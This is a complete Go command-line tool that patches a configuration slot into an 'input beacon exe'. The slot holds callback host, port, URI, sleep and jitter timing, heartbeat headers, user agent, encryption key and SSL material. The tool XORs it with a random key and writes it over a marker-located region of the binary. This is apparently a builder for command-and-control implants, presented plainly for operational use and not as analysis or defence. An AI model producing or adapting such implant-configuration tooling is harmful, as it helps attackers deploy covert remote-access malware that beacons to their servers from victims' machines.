package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"hash/crc32"
	"os"
)

const (
	slotSize   = 4096
	version    = 2
	flagXOR    = 0x0001
	keySize    = 32
	headerSize = 16 + keySize
)

const (
	cfgSleepTime          uint16 = 5
	cfgJitter             uint16 = 6
	cfgHTTPHost           uint16 = 100
	cfgHTTPPort           uint16 = 101
	cfgHTTPURI            uint16 = 102
	cfgHTTPReconnectCount uint16 = 103
	cfgHTTPReconnectTime  uint16 = 104
	cfgHTTPSSL            uint16 = 105
	cfgHTTPMethod         uint16 = 106
	cfgHTTPResponseHeader uint16 = 107
	cfgHTTPHBHeader       uint16 = 108
	cfgHTTPHBPrefix       uint16 = 109
	cfgHTTPEncryptKey     uint16 = 110
	cfgHTTPHostHeader     uint16 = 111
	cfgHTTPUserAgent      uint16 = 112
	cfgHTTPXForwardedFor  uint16 = 113
	cfgHTTPSSLCert        uint16 = 114
	cfgHTTPSSLKey         uint16 = 115
	cfgHTTPCallbackHost   uint16 = 116
)

var marker = []byte{
	0x8d, 0x71, 0x2f, 0xa4, 0x19, 0xc0, 0x46, 0x5e,
	0x93, 0x7b, 0x2a, 0xd8, 0x60, 0x1f, 0xb5, 0x0c,
}

type config struct {
	SleepTime *uint32    `json:"sleep_time"`
	Jitter    *uint32    `json:"jitter"`
	HTTP      httpConfig `json:"http"`
}

type httpConfig struct {
	Host            string  `json:"host"`
	Port            *uint32 `json:"port"`
	CallbackHost    string  `json:"callback_host"`
	URI             string  `json:"uri"`
	ReconnectCount  *uint32 `json:"reconnect_count"`
	ReconnectTime   *uint32 `json:"reconnect_time"`
	SSL             *bool   `json:"ssl"`
	Method          string  `json:"method"`
	ResponseHeaders string  `json:"response_headers"`
	HBHeader        string  `json:"hb_header"`
	HBPrefix        string  `json:"hb_prefix"`
	EncryptKey      string  `json:"encrypt_key"`
	HostHeader      string  `json:"host_header"`
	UserAgent       string  `json:"user_agent"`
	XForwardedFor   *bool   `json:"x_forwarded_for"`
	SSLCert         string  `json:"ssl_cert"`
	SSLKey          string  `json:"ssl_key"`
}

func main() {
	inPath := flag.String("in", "", "input beacon exe")
	outPath := flag.String("out", "", "output patched exe")
	configPath := flag.String("config", "", "profile json")
	flag.Parse()

	if *inPath == "" || *outPath == "" || *configPath == "" {
		fmt.Fprintln(os.Stderr, "usage: patch_profile.exe -in input.exe -out output.exe -config profile.json")
		os.Exit(1)
	}

	cfg, err := readConfig(*configPath)
	if err != nil {
		fatal(err)
	}
	slot, err := buildSlot(cfg)
	if err != nil {
		fatal(err)
	}
	image, err := os.ReadFile(*inPath)
	if err != nil {
		fatal(err)
	}
	offset := findMarker(image)
	if offset < 0 || offset+slotSize > len(image) {
		fatal(fmt.Errorf("profile patch slot marker not found"))
	}
	copy(image[offset:offset+slotSize], slot[:])
	if err := os.WriteFile(*outPath, image, 0644); err != nil {
		fatal(err)
	}
	fmt.Printf("patched profile slot at 0x%x\n", offset)
}

func readConfig(path string) (config, error) {
	var cfg config
	data, err := os.ReadFile(path)
	if err != nil {
		return cfg, err
	}
	err = json.Unmarshal(data, &cfg)
	return cfg, err
}

func buildSlot(cfg config) ([slotSize]byte, error) {
	var slot [slotSize]byte
	plain := buildTLV(cfg)
	if len(plain) == 0 {
		return slot, fmt.Errorf("profile config produced empty TLV")
	}
	if len(plain) > slotSize-headerSize {
		return slot, fmt.Errorf("profile config too large: %d", len(plain))
	}

	key := make([]byte, keySize)
	if _, err := rand.Read(key); err != nil {
		return slot, err
	}
	encrypted := xor(plain, key)

	copy(slot[0:4], []byte("TSCF"))
	binary.BigEndian.PutUint16(slot[4:6], version)
	binary.BigEndian.PutUint16(slot[6:8], flagXOR)
	binary.BigEndian.PutUint32(slot[8:12], uint32(len(plain)))
	binary.BigEndian.PutUint32(slot[12:16], crc32.ChecksumIEEE(plain))
	copy(slot[16:16+keySize], key)
	copy(slot[headerSize:], encrypted)
	return slot, nil
}

func buildTLV(cfg config) []byte {
	var out []byte
	addU32 := func(tag uint16, v *uint32) {
		if v == nil {
			return
		}
		var b [4]byte
		binary.BigEndian.PutUint32(b[:], *v)
		out = appendTLV(out, tag, b[:])
	}
	addBool := func(tag uint16, v *bool) {
		if v == nil {
			return
		}
		b := byte(0)
		if *v {
			b = 1
		}
		out = appendTLV(out, tag, []byte{b})
	}
	addString := func(tag uint16, v string) {
		if v != "" {
			out = appendTLV(out, tag, []byte(v))
		}
	}

	addU32(cfgSleepTime, cfg.SleepTime)
	addU32(cfgJitter, cfg.Jitter)
	addString(cfgHTTPHost, cfg.HTTP.Host)
	addU32(cfgHTTPPort, cfg.HTTP.Port)
	addString(cfgHTTPCallbackHost, cfg.HTTP.CallbackHost)
	addString(cfgHTTPURI, cfg.HTTP.URI)
	addU32(cfgHTTPReconnectCount, cfg.HTTP.ReconnectCount)
	addU32(cfgHTTPReconnectTime, cfg.HTTP.ReconnectTime)
	addBool(cfgHTTPSSL, cfg.HTTP.SSL)
	addString(cfgHTTPMethod, cfg.HTTP.Method)
	addString(cfgHTTPResponseHeader, cfg.HTTP.ResponseHeaders)
	addString(cfgHTTPHBHeader, cfg.HTTP.HBHeader)
	addString(cfgHTTPHBPrefix, cfg.HTTP.HBPrefix)
	addString(cfgHTTPEncryptKey, cfg.HTTP.EncryptKey)
	addString(cfgHTTPHostHeader, cfg.HTTP.HostHeader)
	addString(cfgHTTPUserAgent, cfg.HTTP.UserAgent)
	addBool(cfgHTTPXForwardedFor, cfg.HTTP.XForwardedFor)
	addString(cfgHTTPSSLCert, cfg.HTTP.SSLCert)
	addString(cfgHTTPSSLKey, cfg.HTTP.SSLKey)
	return out
}

func appendTLV(out []byte, tag uint16, value []byte) []byte {
	var h [8]byte
	binary.BigEndian.PutUint16(h[0:2], tag)
	binary.BigEndian.PutUint32(h[4:8], uint32(len(value)))
	out = append(out, h[:]...)
	return append(out, value...)
}

func xor(in []byte, key []byte) []byte {
	out := make([]byte, len(in))
	for i := range in {
		out[i] = in[i] ^ key[i%len(key)]
	}
	return out
}

func findMarker(image []byte) int {
	for i := 0; i+len(marker) <= len(image); i++ {
		ok := true
		for j := range marker {
			if image[i+j] != marker[j] {
				ok = false
				break
			}
		}
		if ok {
			return i
		}
	}
	return -1
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "error:", err)
	os.Exit(1)
}
